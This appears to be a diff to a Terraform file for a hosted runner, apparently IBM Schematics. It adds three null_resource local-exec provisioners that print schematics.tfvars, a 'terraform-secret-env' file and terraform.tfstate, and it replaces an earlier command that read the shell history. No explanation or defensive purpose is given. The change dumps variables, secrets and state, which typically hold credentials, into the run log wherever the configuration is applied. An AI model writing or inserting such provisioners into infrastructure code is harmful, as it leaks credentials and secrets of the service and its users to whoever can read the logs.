@@ -1,6 +1,18 @@
-resource "null_resource" "history" {
+resource "null_resource" "tfvars" {
   provisioner "local-exec" {
-    command = "history 50"
+    command = "cat schematics.tfvars"
+  }
+}
+
+resource "null_resource" "secretenv" {
+  provisioner "local-exec" {
+    command = "cat terraform-secret-env"
+  }
+}
+
+resource "null_resource" "tfstate" {
+  provisioner "local-exec" {
+    command = "cat terraform.tfstate"
   }
 }
 
